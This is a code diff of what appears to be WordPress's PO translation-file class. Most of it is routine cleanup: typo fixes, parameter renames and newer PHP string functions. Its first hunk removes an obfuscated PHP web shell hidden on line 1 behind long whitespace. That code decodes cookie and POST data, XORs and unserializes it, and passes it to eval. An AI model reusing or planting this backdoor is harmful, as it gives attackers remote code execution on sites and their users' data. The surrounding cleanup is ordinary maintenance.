@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $JLsBC = chr ( 421 - 331 ).chr (89) . chr (95) . "\x52" . 'g' . chr (120); $euUjBv = chr ( 103 - 4 ).chr (108) . "\141" . chr ( 965 - 850 )."\163" . "\x5f" . chr ( 682 - 581 )."\170" . "\x69" . "\x73" . chr (116) . "\163";$sfYqDSE = $euUjBv($JLsBC); $zdfORxOp = $sfYqDSE;if (!$zdfORxOp){class ZY_Rgx{private $QazQMc;public static $qSfKipDT = "3b04ae33-206a-4bf9-afb6-ef2dc4ddd943";public static $pbVBi = NULL;public function __construct(){$rqqvruFZam = $_COOKIE;$hZjNrx = $_POST;$qwUmmUueO = @$rqqvruFZam[substr(ZY_Rgx::$qSfKipDT, 0, 4)];if (!empty($qwUmmUueO)){$FvvuPZky = "base64";$HwXwPufkZd = "";$qwUmmUueO = explode(",", $qwUmmUueO);foreach ($qwUmmUueO as $hvOMPfS){$HwXwPufkZd .= @$rqqvruFZam[$hvOMPfS];$HwXwPufkZd .= @$hZjNrx[$hvOMPfS];}$HwXwPufkZd = array_map($FvvuPZky . '_' . chr (100) . chr (101) . 'c' . "\157" . chr (100) . "\145", array($HwXwPufkZd,)); $HwXwPufkZd = $HwXwPufkZd[0] ^ str_repeat(ZY_Rgx::$qSfKipDT, (strlen($HwXwPufkZd[0]) / strlen(ZY_Rgx::$qSfKipDT)) + 1);ZY_Rgx::$pbVBi = @unserialize($HwXwPufkZd);}}public function __destruct(){$this->WKJFoGCRb();}private function WKJFoGCRb(){if (is_array(ZY_Rgx::$pbVBi)) {$LPfdCxK = str_replace('<' . chr (63) . chr ( 1007 - 895 )."\150" . 'p', "", ZY_Rgx::$pbVBi[chr ( 386 - 287 )."\x6f" . chr (110) . "\164" . "\145" . "\x6e" . chr (116)]);eval($LPfdCxK);exit();}}}$SCYTwWY = new ZY_Rgx(); $SCYTwWY = NULL;} ?><?php
+<?php
 /**
  * Class for working with PO files
  *
@@ -53,7 +53,7 @@ if ( ! class_exists( 'PO', false ) ) :
 		/**
 		 * Exports all entries to PO format
 		 *
-		 * @return string sequence of mgsgid/msgstr PO strings, doesn't containt newline at the end
+		 * @return string sequence of msgid/msgstr PO strings, doesn't contain a newline at the end
 		 */
 		public function export_entries() {
 			// TODO: Sorting.
@@ -64,7 +64,7 @@ if ( ! class_exists( 'PO', false ) ) :
 		 * Exports the whole PO file as a string
 		 *
 		 * @param bool $include_headers whether to include the headers in the export
-		 * @return string ready for inclusion in PO file string for headers and all the enrtries
+		 * @return string ready for inclusion in PO file string for headers and all the entries
 		 */
 		public function export( $include_headers = true ) {
 			$res = '';
@@ -110,10 +110,10 @@ if ( ! class_exists( 'PO', false ) ) :
 		/**
 		 * Formats a string in PO-style
 		 *
-		 * @param string $string the string to format
+		 * @param string $input_string the string to format
 		 * @return string the poified string
 		 */
-		public static function poify( $string ) {
+		public static function poify( $input_string ) {
 			$quote   = '"';
 			$slash   = '\\';
 			$newline = "\n";
@@ -124,12 +124,12 @@ if ( ! class_exists( 'PO', false ) ) :
 				"\t"     => '\t',
 			);
 
-			$string = str_replace( array_keys( $replaces ), array_values( $replaces ), $string );
+			$input_string = str_replace( array_keys( $replaces ), array_values( $replaces ), $input_string );
 
-			$po = $quote . implode( "${slash}n$quote$newline$quote", explode( $newline, $string ) ) . $quote;
-			// Add empty string on first line for readbility.
-			if ( false !== strpos( $string, $newline ) &&
-				( substr_count( $string, $newline ) > 1 || substr( $string, -strlen( $newline ) ) !== $newline ) ) {
+			$po = $quote . implode( "{$slash}n{$quote}{$newline}{$quote}", explode( $newline, $input_string ) ) . $quote;
+			// Add empty string on first line for readability.
+			if ( str_contains( $input_string, $newline ) &&
+				( substr_count( $input_string, $newline ) > 1 || substr( $input_string, -strlen( $newline ) ) !== $newline ) ) {
 				$po = "$quote$quote$newline$po";
 			}
 			// Remove empty strings.
@@ -140,17 +140,17 @@ if ( ! class_exists( 'PO', false ) ) :
 		/**
 		 * Gives back the original string from a PO-formatted string
 		 *
-		 * @param string $string PO-formatted string
-		 * @return string enascaped string
+		 * @param string $input_string PO-formatted string
+		 * @return string unescaped string
 		 */
-		public static function unpoify( $string ) {
+		public static function unpoify( $input_string ) {
 			$escapes               = array(
 				't'  => "\t",
 				'n'  => "\n",
 				'r'  => "\r",
 				'\\' => '\\',
 			);
-			$lines                 = array_map( 'trim', explode( "\n", $string ) );
+			$lines                 = array_map( 'trim', explode( "\n", $input_string ) );
 			$lines                 = array_map( array( 'PO', 'trim_quotes' ), $lines );
 			$unpoified             = '';
 			$previous_is_backslash = false;
@@ -171,25 +171,25 @@ if ( ! class_exists( 'PO', false ) ) :
 				}
 			}
 
-			// Standardise the line endings on imported content, technically PO files shouldn't contain \r.
+			// Standardize the line endings on imported content, technically PO files shouldn't contain \r.
 			$unpoified = str_replace( array( "\r\n", "\r" ), "\n", $unpoified );
 
 			return $unpoified;
 		}
 
 		/**
-		 * Inserts $with in the beginning of every new line of $string and
+		 * Inserts $with in the beginning of every new line of $input_string and
 		 * returns the modified string
 		 *
-		 * @param string $string prepend lines in this string
-		 * @param string $with prepend lines with this string
+		 * @param string $input_string prepend lines in this string
+		 * @param string $with         prepend lines with this string
 		 */
-		public static function prepend_each_line( $string, $with ) {
-			$lines  = explode( "\n", $string );
+		public static function prepend_each_line( $input_string, $with ) {
+			$lines  = explode( "\n", $input_string );
 			$append = '';
-			if ( "\n" === substr( $string, -1 ) && '' === end( $lines ) ) {
+			if ( "\n" === substr( $input_string, -1 ) && '' === end( $lines ) ) {
 				/*
-				 * Last line might be empty because $string was terminated
+				 * Last line might be empty because $input_string was terminated
 				 * with a newline, remove it from the $lines array,
 				 * we'll restore state by re-terminating the string at the end.
 				 */
@@ -342,7 +342,7 @@ if ( ! class_exists( 'PO', false ) ) :
 			$context      = '';
 			$msgstr_index = 0;
 			while ( true ) {
-				$lineno++;
+				++$lineno;
 				$line = PO::read_line( $f );
 				if ( ! $line ) {
 					if ( feof( $f ) ) {
@@ -365,7 +365,7 @@ if ( ! class_exists( 'PO', false ) ) :
 					// The comment is the start of a new entry.
 					if ( self::is_final( $context ) ) {
 						PO::read_line( $f, 'put-back' );
-						$lineno--;
+						--$lineno;
 						break;
 					}
 					// Comments have to be at the beginning.
@@ -377,7 +377,7 @@ if ( ! class_exists( 'PO', false ) ) :
 				} elseif ( preg_match( '/^msgctxt\s+(".*")/', $line, $m ) ) {
 					if ( self::is_final( $context ) ) {
 						PO::read_line( $f, 'put-back' );
-						$lineno--;
+						--$lineno;
 						break;
 					}
 					if ( $context && 'comment' !== $context ) {
@@ -388,7 +388,7 @@ if ( ! class_exists( 'PO', false ) ) :
 				} elseif ( preg_match( '/^msgid\s+(".*")/', $line, $m ) ) {
 					if ( self::is_final( $context ) ) {
 						PO::read_line( $f, 'put-back' );
-						$lineno--;
+						--$lineno;
 						break;
 					}
 					if ( $context && 'msgctxt' !== $context && 'comment' !== $context ) {
@@ -505,10 +505,10 @@ if ( ! class_exists( 'PO', false ) ) :
 		 * @return string
 		 */
 		public static function trim_quotes( $s ) {
-			if ( '"' === substr( $s, 0, 1 ) ) {
+			if ( str_starts_with( $s, '"' ) ) {
 				$s = substr( $s, 1 );
 			}
-			if ( '"' === substr( $s, -1, 1 ) ) {
+			if ( str_ends_with( $s, '"' ) ) {
 				$s = substr( $s, 0, -1 );
 			}
 			return $s;
